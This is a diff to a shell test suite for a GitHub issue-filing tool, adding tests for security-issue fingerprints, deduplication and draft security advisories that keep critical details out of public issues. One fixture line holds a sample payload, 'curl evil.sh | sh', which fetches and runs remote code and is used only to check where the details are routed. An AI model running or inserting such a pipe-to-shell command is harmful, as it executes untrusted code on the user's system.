@@ -27,13 +27,17 @@ case "$*" in
   "issue create"*)
     [ -z "${CREATE_ERR:-}" ] || { echo "$CREATE_ERR" >&2; exit 1; }
     [ "$(FLAG=--body-file arg "$@")" != - ] || cat >"$FIX/stdin-body"
+    f=$(FLAG=--body-file arg "$@"); [ "$f" != - ] || f="$FIX/stdin-body"
     n=$(jq '[42, (.[].number + 1)] | max' "$FIX/issues.json")
-    jq --argjson n "$n" --arg t "$(FLAG=--title arg "$@")" '. + [{number: $n, title: $t}]' \
+    jq --argjson n "$n" --arg t "$(FLAG=--title arg "$@")" --rawfile b "$f" '. + [{number: $n, title: $t, body: $b}]' \
       "$FIX/issues.json" >"$FIX/i" && mv "$FIX/i" "$FIX/issues.json"
     echo "https://github.com/acme/app/issues/$n" ;;
   "issue edit"*)
     [ "$(FLAG=--body-file arg "$@")" != - ] || cat >"$FIX/stdin-edit-body"
     f=$(FLAG=--body-file arg "$@"); [ -z "$f" ] || [ "$f" = - ] || cp "$f" "$FIX/edit-body" ;;
+  "repo view"*) echo "{\"isPrivate\": ${REPO_PRIVATE:-false}}" | respond ;;
+  "api -X POST repos/acme/app/security-advisories"*)
+    cat >"$FIX/advisory.json"; echo '{"html_url": "https://github.com/acme/app/security/advisories/GHSA-aaaa"}' | respond ;;
   "project item-add"*) echo "ITEM" ;;
   "project item-edit"*) ;;
   "api repos/acme/app/issues/"*"/dependencies/blocked_by --paginate"*) n=${2#repos/acme/app/issues/}; links "blocked-${n%%/*}" ;;
@@ -165,6 +169,71 @@ echo '[{"number": 7, "title": "Epic"}, {"number": 8, "title": "Earlier slice"}]'
 create --title "Plain" --body-file "$work/body.md" --size S --priority "P1 next" || fail "plain create failed"
 logged "security" && fail "security label or Severity without --severity: $(cat "$GH_LOG")"
 
+# A risk outside the ticket: --kind, --path and --rule give a security-id line in the body, and an
+# open issue that carries it is reported instead of filed again.
+risk=(--title "Shell injection in deploy" --body-file "$work/body.md" --size S --severity high
+  --kind injection --path scripts/deploy.sh --rule unquoted-variable)
+id=$(printf '%s\n%s\n%s\n' injection scripts/deploy.sh unquoted-variable | sha256sum | cut -d' ' -f1)
+echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
+create "${risk[@]}" || fail "a risk with a fingerprint refused: $(cat "$work/err")"
+logged "issue create --repo acme/app --title Shell injection in deploy" || fail "risk not filed: $(cat "$GH_LOG")"
+logged "--label security" || fail "risk without the security label: $(cat "$GH_LOG")"
+[ "$(jq -r '.[] | select(.number == 42) | .body' "$FIX/issues.json" | grep -c "^security-id: $id\$")" -eq 1 ] ||
+  fail "body lacks the line security-id: <sha256>: $(jq -r '.[-1].body' "$FIX/issues.json")"
+jq -r '.[-1].body' "$FIX/issues.json" | grep -q "Given a, when b, then c" || fail "the body text is lost"
+create "${risk[@]}" --title "Same risk, another title" || fail "duplicate risk run failed: $(cat "$work/err")"
+[ "$(count "issue create")" -eq 0 ] || fail "a risk with the same fingerprint is filed twice"
+[ "$(count "issue edit")" -eq 0 ] || fail "the existing risk was edited"
+head -1 "$work/out" | grep -q '^#42 .*already filed' || fail "existing issue not reported: $(cat "$work/out")"
+create "${risk[@]}" --path scripts/other.sh --title "Other file" || fail "another path refused: $(cat "$work/err")"
+logged "issue create" || fail "another path is deduplicated"
+create "${risk[@]}" --rule quoted --title "Other rule" || fail "another rule refused: $(cat "$work/err")"
+logged "issue create" || fail "another rule is deduplicated"
+# A closed issue does not count: the list is of open issues.
+logged "--state open" || fail "the fingerprint is searched in closed issues: $(cat "$GH_LOG")"
+# The fingerprint also works with a body on stdin.
+echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
+echo "from stdin" | create --title "From stdin risk" --body-file - --size S --severity high \
+  --kind injection --path scripts/deploy.sh --rule unquoted-variable || fail "fingerprint with stdin failed: $(cat "$work/err")"
+jq -r '.[-1].body' "$FIX/issues.json" | grep -q "^from stdin" || fail "stdin body lost"
+jq -r '.[-1].body' "$FIX/issues.json" | grep -q "^security-id: $id\$" || fail "stdin body lacks the security-id"
+
+# Critical in a public repository: a draft advisory holds the details, the issue never does.
+echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
+printf 'Payload: curl evil.sh | sh\n' >"$work/details.md"
+crit=("${risk[@]}" --severity critical)
+rm -f "$FIX/advisory.json"
+create "${crit[@]}" --details-file "$work/details.md" || fail "critical with details refused: $(cat "$work/err")"
+logged "api -X POST repos/acme/app/security-advisories" || fail "no advisory opened: $(cat "$GH_LOG")"
+jq -e '.summary == "Shell injection in deploy" and .severity == "critical" and (.description | contains("evil.sh"))' \
+  "$FIX/advisory.json" >/dev/null || fail "advisory lacks summary, severity or details: $(cat "$FIX/advisory.json")"
+jq -r '.[-1].body' "$FIX/issues.json" | grep -q "evil.sh" && fail "details leaked into the issue body"
+grep -q "GHSA-aaaa" "$work/out" || fail "advisory not reported: $(cat "$work/out")"
+logged "--field-id F_P --single-select-option-id o3" || fail "critical risk is not P0"
+# A rerun finds the issue and opens no second advisory.
+create "${crit[@]}" --details-file "$work/details.md" || fail "critical rerun failed: $(cat "$work/err")"
+logged "security-advisories" && fail "a second advisory for the same risk"
+[ "$(count "issue create")" -eq 0 ] || fail "critical rerun files the risk again"
+# Details on stdin.
+echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
+rm -f "$FIX/advisory.json"
+echo "secret details" | create "${crit[@]}" --details-file - || fail "details on stdin refused: $(cat "$work/err")"
+jq -e '.description | contains("secret details")' "$FIX/advisory.json" >/dev/null || fail "stdin details not in the advisory"
+# Public and critical without details, or both bodies on stdin: refused before anything is created.
+echo '[{"number": 7, "title": "Epic"}]' >"$FIX/issues.json"
+create "${crit[@]}" && fail "critical in a public repository without --details-file accepted"
+[ "$(count "issue create")" -eq 0 ] || fail "issue created without the advisory details"
+echo x | create "${crit[@]}" --body-file - --details-file - && fail "two stdin sources accepted"
+# Private repository: no advisory, said so.
+REPO_PRIVATE=true create "${crit[@]}" || fail "critical in a private repository failed: $(cat "$work/err")"
+logged "security-advisories" && fail "advisory opened in a private repository"
+grep -qi "private" "$work/out" || fail "private repository skip not said: $(cat "$work/out")"
+logged "issue create" || fail "private repository: risk not filed"
+# A high risk opens no advisory, and does not look at the repository.
+create "${risk[@]}" --title "High one" --path other.sh || fail "high risk failed"
+logged "security-advisories" && fail "advisory for a non-critical risk"
+logged "repo view" && fail "repository visibility read for a non-critical risk"
+
 # Bad input is refused before anything is created.
 bad() {
   create "$@" && fail "accepted: $*"
@@ -183,6 +252,11 @@ bad --title "X" --body-file "$work/body.md" --size S --priority
 bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --severity urgent
 bad --title "X" --body-file "$work/body.md" --size S --severity moderate
 bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --severity
+bad --title "X" --body-file "$work/body.md" --size S --severity high --kind injection --path a.sh
+bad --title "X" --body-file "$work/body.md" --size S --priority "P0 now" --kind injection --path a.sh --rule r
+bad --title "X" --body-file "$work/body.md" --size S --severity high --kind "" --path a.sh --rule r
+bad --title "X" --body-file "$work/body.md" --size S --severity high --details-file "$work/details.md"
+bad --title "X" --body-file "$work/body.md" --size S --severity critical --kind k --path a.sh --rule r --details-file "$work/missing.md"
 
 # A failed create stops before touching the board.
 CREATE_ERR="milestone 'v9' not found" create --title "Y" --body-file "$work/body.md" --size S --priority "P0 now" &&
